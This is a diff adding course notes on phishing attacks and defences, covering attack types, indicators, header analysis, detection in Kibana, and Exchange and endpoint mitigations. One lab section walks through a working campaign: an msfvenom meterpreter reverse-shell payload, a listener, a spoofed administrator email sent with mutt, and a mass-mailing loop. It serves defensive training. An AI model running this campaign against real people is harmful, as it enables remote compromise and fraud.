@@ -1,3 +1,300 @@
+# MOD 16
+## Phishing Attacks and Defenses
+### Phishing Attacks
+- _Phishing is a cybercrime in which a target or targets are contacted by email, telephone, or text message by someone posing as a legitimate institution to lure individuals into providing sensitive data such as Personally Identifiable Information (PII), banking and credit card details, and passwords._
+- Social engineering is an attack that exploits the human element of an organization’s security.
+- Phishing is a subset of social engineering, which coerces users to divulge sensitive information or perform an action that they would not under normal circumstances, such as clicking on a malicious link or opening an attachment.
+- Typically, attackers run phishing campaigns via email, however, other mediums such as phone calls or Short Messaging Service (SMS) have gained popularity as phishing platforms.
+- **Spear phishing**, a targeted form of a phishing attack, is widely **used for initial access** as per MITRE, primarily due to ease and accessibility.
+- Anyone can send fake emails, and several tools such as SET facilitate sending mass emails with little technical knowledge, making these attacks widely accessible.
+- Script kiddies and nation-state actors alike have been known to initiate phishing attacks; a testament to their success.
+
+### Types of Phishing Attacks
+- Phishing is a broad principle of attack that has many avenues of approach. Some common types of phishing attacks include, but are not limited to:
+   - Spear Phishing
+      - This is a targeted form of phishing, in which the attacker tailors content specific to an organization, group, or individual.
+      - In spear phishing, attackers conduct research on the target in order to make the attack more personalized and increase the likelihood of a successful phishing attack.
+      - An example of a spear phishing attack: Dragonfly, a cyber espionage group, sent spear phishing emails to employees working on US power grids that contained malicious attachments in hopes of gaining initial access into those systems.
+   - Whaling
+      - Whaling is another targeted phishing attack that is aimed towards **high-profile targets**, such as individuals that are part of the C-level suite at an organization.
+      - More effort and research goes into crafting of these emails due to the high returns for cybercriminals.
+      - As higher level personnel often have more access to sensitive information or more authority, the payout of whaling attacks are potentially higher than other phishing attacks.
+      - Whaling may have follow-on phishing attacks after the high-profile account is compromised, such as using the Chief Executive Officer’s (CEO) account to ask for a money transfer.
+   - Vishing
+      - Vishing refers to phishing scams that take place over the phone.
+      - Comparatively, vishing has the most human interaction of all the phishing attacks but follows the same pattern of deception.
+      - The malicious actor often creates a sense of urgency to convince a victim to divulge sensitive information and uses spoofed caller Identification (ID) to appear as a trustworthy source.
+      - A typical scenario involves the attacker posing as a bank employee to flag up suspicious behavior on an account.
+      - Once they have gained the victim’s trust, they ask for personal information such as login details, passwords, and Personal Identification Numbers (PIN).
+      - The details are then used to empty bank accounts or commit identity fraud.
+   - Smishing
+      - Smishing is a type of phishing which uses SMS messages as opposed to emails to target individuals.
+      - As smartphones gain more functionality, they also accumulate more vectors of attack. Similar to traditional email phishing, attackers can send malicious links, or use high pressure tactics to have users divulge sensitive information.
+   - Clone Phishing
+      - Clone phishing is a subset of a phishing attack that takes elements from an already sent legitimate email and replaces them with malicious counterparts.
+      - This could include spoofing an email address to appear similar to the original sender, replacing a legitimate link with a malicious one, or claiming to be a resend of the original email. 
+
+### Indicators of Phishing
+- Attackers use several Techniques, Tactics, and Procedures (TTP) to conduct phishing campaigns. If a message contains some of these elements, then it may be part of a phishing attack.
+
+#### Deceiving the Victim
+- Attackers use several tactics to deceive the victim.
+- This includes, but is not limited to, sending enticing messages, creating a sense of urgency, impersonating a trusted sender, and appealing to authority.
+
+#### Sending Enticing Messages
+- Lucrative offers and eye-catching or attention-grabbing statements are designed to attract people’s attention immediately.
+- For instance, a message may claim that the intended victim won the lottery or that there is a hot single in the area waiting to meet.
+- If the message sounds too good to be true, there is a strong chance that it is a phishing scam.
+- Alternatively, something as simple as a link to a funny video or an interesting news article can be a phishing email as well.
+- Attackers utilize seemingly endless amounts of tactics to entice users to click their malicious emails.
+
+#### Creating a Sense of Urgency 
+- Cybercriminals often create a sense of urgency by stating that their hook requires immediate action.
+- Victims feel compelled to act quickly and, as a result, make worse decisions than they normally would.
+- An example is stating that deals are only for a limited time, or that a personal account may be suspended immediately if the victim does not take action within a few minutes.
+- When in doubt, the best course of action is to independently verify with the organization that there is an issue.
+
+#### Impersonating a Trusted Sender 
+- While it is possible to spoof email addresses under certain circumstances, it is also possible that legitimate email accounts are compromised and used in phishing campaigns.
+- In the case that an email coming from a trusted source displays some phishing indicators, it is generally a good idea to independently verify with the organization/individual.
+- Alternatively, attackers use domain names that are close to the domain that they are attempting to impersonate.
+- For example, bankofarnerica.com looks similar to the legitimate domain bankofamerica.com, with the rn potentially passing as an m at first glance.
+
+#### Appealing to Authority
+- People are more likely to obey someone they perceive has some kind of authority.
+- Common phishing attacks may impersonate organizations or figures of authority.
+- Attackers may claim to be part of law enforcement, the Internal Revenue Service (IRS), or other government organization to make the victim more likely to cooperate.
+- In DoD environments, pulling rank is a common method of trying to get things done by appealing to authority.
+- As with trusted senders, independently verifying with the organization of authority is generally a good idea when in doubt.
+
+### Phishing Email Contents
+- Unless the purpose of the phishing attack was to simply elicit information from the victim, the attacker needs to deliver something in the content that has the capacity to execute code.
+- In most cases, a user getting exploited simply by opening an email is unlikely.
+- In the past, some mail clients allowed JavaScript, which brought the possibility of exploitation just from opening the email.
+- Now, most modern email clients only allow for Hypertext Markup Language (HTML) or plain-text, which does not allow code execution.
+- This would require a vulnerability in the mail client to implement, and is a rare occurrence albeit not impossible.
+- More common methods used by attackers are malicious attachment files or getting the user to navigate to a malicious website by clicking a link.
+
+#### Attachments
+- Attachments in phishing emails often contain malicious payloads.
+- In the past, a popular method was simply attaching an executable and attempting to convince a user to run it.
+- As email filters become more and more sophisticated at protecting users from themselves by disallowing certain file types, attackers had to adapt.
+- They now implement their code in more innocuous seeming file types.
+- An attacker can easily embed JavaScript in a Portable Document Format (PDF) file or macros in Microsoft Office documents that execute once opened.
+
+#### Links
+- The sky is the limit once the victim decides to click on a hyperlink taking them to a location of the attacker’s choice.
+- Since the attacker controls the website, they can initiate a variety of attacks here.
+- Attackers can steal cookies, attempt to exploit the user’s browser, etc. A user can be exploited from just visiting a website.
+
+### Other Indicators of Phishing
+#### Misspellings and Grammatical Errors
+- There are a few reasons for misspellings and typos in a phishing email.
+- The most common sense reason is that the cybercriminals sending them may not be from English-speaking countries, thus do not have a good handle on the language.
+- Another reason is that email filters look for specific strings in emails to make filtering decisions.
+- If words are misspelled, then the email filter may allow the email to reach the user’s inbox.
+- A more insidious reason for the prevalence of typos in phishing emails is that cyber criminals want to isolate the most gullible targets by sending overly ridiculous emails.
+
+#### Unexpected Domain or Sender
+- Attackers may use free email services or send emails from unexpected domain names.
+- Phishing campaigns are initiated by attackers with a broad range of technical skill.
+- Since the only thing needed for a phishing attack is an email address that can send emails, attackers often use free email services such as Gmail or Yahoo email accounts to send phishing emails. 
+
+#### Unusual Email Headers
+- Emails that have spoofed sender data may show inconsistencies in the email headers.
+- Simple Mail Transport Protocol (SMTP) does not have mechanisms for validating email by default.
+- If an attacker has access to their own mail server, they can control some of the data that goes in the email headers. Some fields that may help identify phishing attacks are:
+   - Received-By: There may be multiple entries in this field.
+      - Emails typically contain entries of all mail server hostnames and Internet Protocol (IP) addresses they have traversed to reach their final destination, similar to a traceroute.
+      - The first destination in the chain, or the mail server that the attacker first relayed the mail to, may be a giveaway that the email is not legitimate.
+   - Received-SPF: Sender Policy Framework (SPF) is an email security mechanism that allows administrators to specify allowed IP addresses and hostnames authorized to send mail on behalf of a domain.
+      - An email with a spoofed sender may fail this check.
+   - Authentication-Results: This field contains information related to Domain Key Identified Mail (DKIM), Domain-based Message Authentication Reporting and Conformance (DMARC), and SPF.
+      - DKIM, DMARC, and SPF work together to provide email authentication.
+      - If this field states that these checks did not pass, the user should rightfully be wary.
+      - These protocols are discussed in more detail later in the lesson.
+   - Return-Path: This is the field that specifies where messages that failed to send go.
+      - This is required to be a real email address, and is often what email security protocols check.
+      - Defenders can compare the Return-Path to the From field, which may reveal spoofing.
+
+<img width="625" height="466" alt="c008a512-40fe-4588-891d-ceebcb36b53a" src="https://github.com/user-attachments/assets/c83e4fb1-2bc9-4bea-b4e1-178c9ff30d12" />
+
+### Phishing Follow-On Actions
+- Once the attacker successfully deceives the victim, follow-on actions typically include:
+
+#### Gathering Data
+- This attack does not deliver a payload in a technical sense.
+- Victims divulge sensitive information, such as social security numbers, bank account numbers, and other PII. This can result in identity theft for the victim.
+
+#### Harvesting Credentials
+- Credential harvesting can be considered a subset of data gathering.
+- Attackers attempt to gather login credentials, which could allow for follow-on attacks.
+- A common phishing attack involves notifying users that their credentials were compromised, and to change their password by clicking on a link in the email.
+- The link takes the victim to a site that impersonates the site’s login page. When users enter their credentials, the attacker collects them.
+
+#### Executing Code
+- An attacker may want more functionality after they successfully compromise a victim’s machine, which they can achieve via running their own specific code or running commands.
+- If desired, they can deliver an exploit depending on the software, and/or drop a payload, if no exploit was needed (run reconnaissance surveys, etc.).
+- Advanced Persistent Threat (APT) 28, or FANCY BEAR, is a Russian nation-state actor that has utilized phishing messages using spoofed websites to harvest credentials against their targets of interest in the US and Western Europe.
+
+#### Conducting a Phishing Campaign
+- Conduct a simple phishing campaign to gain insight into how one might be performed.
+- Use the popular Mutt command line email client to send phishing emails with a standard meterpreter executable as the payload.
+- Carry out a mass mailing campaign once they are successful with the requisite tasks.
+1. Run the following commands to verify the Postfix service is functional: `sudo systemctl status postfix` and `sudo ss -lptn`
+2. Create a malicous payload via msfvenom: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=199.63.64.51 LPORT=4444 -f exe-small -o attachment.exe`
+   ` The options used in this command are:
+   - -p: Specifies the desired payload. Since the target(s) in this domain are Windows 10 workstations, the appropriate payload is the 64-bit windows reverse TCP payload.
+      - The reverse_tcp payload has the benefit of being better at circumventing end user host and network firewalls since the connection is initiated by the end user’s host device.
+   - LHOST: This is the address that the exploited device calls back to.
+   - LPORT: This is the port that the exploited device calls back to.
+   - -f: This is the file format of the created payload. exe-small creates small Windows-compatible payloads.
+   - -o: This option specifies the output file: attachment.exe.
+3. Zip the payload: `zip attachment.zip attachment.exe`
+4. Open _msfconsole_ in a new window
+5. Run `use multi/handler`
+6. Set your payload: `windows/x64/meterpreter/reverse_tcp` and show your options
+7. Set up the listening host `set LHOST 0.0.0.0`, verify everything is correct, and then run `run -j` to start the listener as a job
+8. From the other window, run the following to create a message for the email body: `echo 'This is your company administrator. Malware has been detected on your computer. Use the attached zip file to remove the virus immediately!' > message.txt`
+9. Run the following to send the email with the attachment: `mutt -e 'my_hdr From:admin <admin@cda.com>' -s "DETECTED MALWARE!" phishme@cda.com -a attachment.zip < message.txt`
+    - -e: Specifies a configuration option. This command spoofs the administrator’s email address by changing the contents of the From field.
+    - -s: Subject line of the message
+    - -a: Specifies a file to attach
+    - phishme@cda.com: The recipient and the target of the attempted phish.
+    - < message.txt: Redirects the contents of message.txt into the command, which sets the contents of the file as the message body.
+10. Log into Outlook
+11. Open up the email, download the malware and run it
+12. Switch back to msfconsole window, a new _meterpreter_ session opened, run `session -i 1` to make an interactable session
+13. Run `getuid` to see what it is running
+14. Exit the session, and open a vim session for emails.txt: `vim emails.txt`
+15. Run the following command to send emails to all users: `for email in $(cat emails.txt); do mutt -e 'my_hdr From:admin <admin@cda.com>' -s "DETECTED MALWARE!" $email -a attachment.zip < message.txt; done`
+16. Run `sudo grep "status=sent" /var/log/mail.log` to verify the emails were successfully sent
+
+### Phishing Attack Detection
+- On a network, some indicators of phishing include:
+   - Several emails coming from a single user: There may be a few reasons an attacker uses a single user to send several emails.
+      - A compromised email account may be trustworthy in a specific domain.
+      - Alternatively, creating an email account and sending mass emails is a trivial matter for attackers.
+   - Several emails coming from a suspicious domain: Suspicious domains refer to either an unexpected domain (e.g., a free email service domain like Yahoo or Gmail).
+      - External domains are inherently more suspicious than internal domains.
+      - It can also refer to a domain that the attacker is attempting to impersonate.
+   - Unusual email headers: Unusual email headers may give away a spoofed email address, though this practice is uncommon with modern day email authentication protocols.
+- If there are phishing indicators on a network, then hunt for additional indicators of compromise within the mission partner’s networks.
+- NIDS and Security Information and Event Management (SIEM) systems are helpful in detecting phishing attacks over a network.
+- Observe some signs of a phishing attack occurring over the mission partner’s network using Kibana and Zeek logs.
+
+### Detecting Phishing Emails
+1. Enter Security Onion, and update your date range
+   - Focus on Mail protocols, but below are lists of different ports/protocols:
+     <img width="965" height="238" alt="9a1d98a0-a941-46d3-abd2-77434a84ccf7" src="https://github.com/user-attachments/assets/929deb68-bd59-4744-84e4-43496d39470f" />
+     <img width="965" height="292" alt="15947c48-8813-4c09-bcdb-60e4e7ab6653" src="https://github.com/user-attachments/assets/6cf03c85-4b29-4822-8160-24f496e22618" />
+     <img width="965" height="238" alt="8e34eee2-5674-45da-80b9-428e4a3247b6" src="https://github.com/user-attachments/assets/5c697950-c3c4-41a9-bf1e-d6655534a833" />
+2. Filter down on SMTP
+3. Open up the _Discover_ area in Kibana
+4. Select the following fields to toggle:
+   - _id: An Elasticsearch metadata field that assigns a unique index to an Elasticsearch document.
+   - smtp.first_received: First host and IP address that received the message.
+   - smtp.from: Displayed sender; this field can be spoofed.
+   - smtp.mail_date: Contents of the date field.
+   - smtp.mail_from: Real sender address; may differ from smtp.from.
+   - smtp.path: Contains the mail servers traversed before the email reached its final destination. The first IP address is the final destination. This field is difficult to spoof as each mail server that the message traverses adds its information to this field.
+   - smtp.recipient_to: Real recipient email that the message is sent to; may differ from smtp.to.
+   - smtp.subject: Subject line of the email.
+   - smtp.to: Displayed recipient.
+5. Select the link in the _ _id _ field, and select the list and hex buttons to turn them off
+6. Scroll to the bottom to see what was sent in the email.
+
+### Defend against Phishing Emails
+#### End User Training
+- At an administrative level, user training and awareness is an effective measure in preventing phishing attacks.
+- In 2018, the Data Breach Investigation Report from Verizon found that organizations reduced their phishing click rates from 25% to 3% over six years with periodic training (Carnegie Mellon Security blog).
+- MITRE also calls out user training as an effective method of reducing the success rate of several social engineering attacks including phishing attempts.
+
+#### Technical Controls
+- Technical controls and user training both work together to reduce incidents related to phishing attacks.
+- It only takes one click to get a foothold in a network, as seen during the phishing attack.
+- Both are essential elements of a successful defensive security policy.
+- Technical controls can be implemented in various parts of the network.
+
+### Mitigations on the Network
+#### Edge Transport Server
+- This is a specific type of relay host in Microsoft Exchange architecture that external organizations send mail to.
+- The Edge Transport Server has several mechanisms to screen emails before they are forwarded to the Exchange mailbox server.
+
+#### Dedicated Spam-filtering Appliance
+- Other vendors have appliances with comparable functionality to Edge Transport Servers, as far as screening mechanisms go.
+- A popular dedicated spam appliance is Barracuda’s Spam Firewall. 
+
+#### Web Application Firewall/Proxy
+- Web application firewalls help protect against cases where a user attempts to navigate to a malicious link — including links that are included in phishing emails.
+- Web application firewalls detect navigation to malicious domains, malicious network traffic, or Command and Control (C2) communications from infected hosts on the network.
+
+### Mitigations on the Mail or Transport Server
+- The mail server, or devices hosting mail-related services, are key places to implement phishing defenses.
+- DoD networks typically utilize Microsoft Exchange services, so the following defenses have a heavy focus on Microsoft Exchange.
+- Some of these defenses include:
+   - **Anti-malware**: Microsoft Exchange has anti-malware features since Exchange 2013.
+      - Outlook gets anti-malware definitions from the internet, and allows the mail administrator to specify the actions taken once mail matches a malware definition in a rule-based format.
+      - The mail administrator specifies which recipients on the mail server the anti-malware scanning policy applies to.
+   - **Spam Filter**: The spam filter in Exchange email architecture is enabled by default on Edge Transport Servers, but can be enabled on the mailbox server as well.
+      - It is made of several components, some are discussed in this section.
+   - **Content Filtering**: By default, content filtering is enabled and done on Edge Transport Servers but can be enabled on the mailbox server.
+      - The Exchange confidence filter works by assigning a Spam Confidence Level (SCL) of 0-9 to a message based on words and phrases in the message, and the mail administrator can make a decision on what happens to the mail depending on the SCL.
+   - **Attachment Filtering**: This feature is only available on Edge servers in Microsoft’s Exchange architecture. Attachment filtering works by examining the name, file extension, or MIME Content-Type and performing an action. The actions are either allow the message, allow the message but strip the attachment, or delete the message.
+   - **Sender Filtering**: This feature is configurable on the mailbox server or Edge server.
+      - Sender filtering is configured to block single users, whole domains, or subdomains.
+   - **Sender ID**: This feature is configurable on the mailbox server or Edge server.
+      - Sender ID protects against email spoofing by checking DNS for SPF records for authorized senders.
+   - **Connection Filtering**: This feature is configurable on the mailbox server or Edge server.
+      - Connection filtering allows blocking messages from the specific IP address of mail servers that the mail administrator does not want to receive mail from. SMTP connections are dropped if an IP address appears on the blacklist.
+   - **Recipient Filtering**: This feature is configurable on the mailbox server or Edge server.
+      - This feature allows mail administrators to specify restricted groups and groups that should not be able to receive mail from the internet.
+      - It also allows mail administrators to specify what actions to take for non-existent users.
+
+### Mitigations on the Endpoints
+- As mentioned previously, two common methods of executing code are by getting users to open attachments, and getting users to click on links.
+- Mitigations can be implemented to reduce the damage of either of those things happening.
+   - **HBSS**: If a user saves an attachment (some mail clients provide the option of opening the attachment without saving it first) from a malicious email on disk, an **HBSS** may flag the malware and quarantine or remove it if it contains some qualities that the HBSS deems unsafe.
+   - Some HBSS software has the capability to examine an attack in memory, which could prevent an attack if the user opens the attachment instead of saving it first.
+   - Some HBSSs may also defend against web attacks. Enabling the HBSS and keeping signatures updated are good practices in defending against phishing attacks.
+   - **Disabling Scripts and Macros**: If a user downloads an attachment with macros, or visits a site from a link with malicious script, it may lead to a compromise.
+   - A good practice is to disable macros in documents by default.
+   - In addition, most browsers have settings that disable JavaScript or other web-based content from running without explicit permission.
+   - One caveat is that JavaScript is ubiquitous, and disabling it breaks functionality on several web servers.
+
+### Other Miscellaneous Mitigations
+- As briefly mentioned before, DKIM, SPF, and DMARC work together as email authentication protocols.
+- Their individual purposes are as follows:
+   - **DKIM**: DKIM uses PKI to sign emails leaving the sending server.
+      - The receiving mail server verifies that the message is authentic and has not been altered in transit by using the public key published in the sending organization’s DNS records.
+   - **SPF**: SPF publishes authorized mail servers and hostnames in a DNS record for the domain.
+      - The receiving mail server checks the SPF record to ensure that the sending mail server is authorized to send mail on a domain’s behalf, usually based on the Return-Path field in the email header.
+   - **DMARC**: DMARC utilizes the previous protocols and adds a reporting feature on top. It allows domain owners to see who is sending emails on their behalf.
+- Implementing these protocols has a two-fold benefit of preventing attackers from spoofing a domain owner’s domain, thus preventing emails from appearing as if they originated inside the organization, and using the domain owner’s domain in phishing attacks against other organizations.
+- If attackers are unable to spoof an organization’s domain, then users are more certain of an email message’s origin and make better informed decisions based on the domain.
+
+### Implementing Technical Phishing Defenses
+1. Open _Exchange Management Shell_
+2. Check status of anti-malware service by running `Get-TransportAgent "Malware Agent"`
+3. Open the _Exchange Administrative Center_
+4. Select _Protection_ and then the + to define a new anti-malware policy
+5. Flll out the information for _Name, Description, and Malware Detection Response_
+6. Scroll down to _Applied to_ section, and select _The recipient domain is_
+7. Select the Domains that you want, click _add ->_ and then click save.
+8. Run `Get-SenderFilterConfig` to get a config of the sender filter
+9. Enable this via `Set-SenderFilterConfig -Enabled $true`
+10. Block known malicous emails via `Set-SenderFilterConfig -BlockedSenders attacker@internet.com`
+11. Block bad domain via `Set-SenderFilterConfig -BlockedDomainAndSubdomains baddomain.com`
+12. Verify the Config
+13. Move over to the user host to configure security policies
+14. Open Word, then select _Word Options > Trust Center_
+15. Select _Trust Center Settings_, then _Macro Settings_; change the setting to _Disable all macros without notification_
+16. Open _Windows Defender Settings_ and ensure that the following are selected _Real-Time Protection: **On**; Cloud-Based Protection: **OFF**; Automatic Sample Submission: **OFF**; Enhanced Notifications: **ON**_
+
+### Phishing Attack and Defense
+1. 
+
+
 # MOD 17
 ## DDOS Attacks & Defenses
 ### What is a DoS/DDoS Attack?
